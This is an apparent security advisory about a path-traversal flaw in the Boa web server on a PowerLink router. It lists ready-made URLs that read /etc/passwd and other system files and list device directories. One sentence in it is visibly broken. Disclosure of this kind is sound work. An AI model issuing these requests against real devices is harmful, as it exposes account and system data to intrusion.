Known issues exist in Boa httpd as per:
FreeBSD-SA-00:60 Security Advisory

http://www.securiteam.com/unixfocus/6G0081P0AI.html and
http://lists.insecure.org/lists/bugtraq/2000/Oct/0445.html

 Since this is a hardware based product with a built in httpd for remote

implications.

Vunerability / Exploit:

Just issue any of the folowing...

http://somepowerlinkWAN.router/../../../../../../../../../../etc/passwd
http://somepowerlinkWAN.router///etc/passwd
http://somepowerlinkWAN.router/etc/passwd
http://somepowerlinkWAN.router/bin/
http://somepowerlinkWAN.router/dev/
http://somepowerlinkWAN.router/tmp/
http://somepowerlinkWAN.router/etc/fstab
http://somepowerlinkWAN.router/etc/mtab
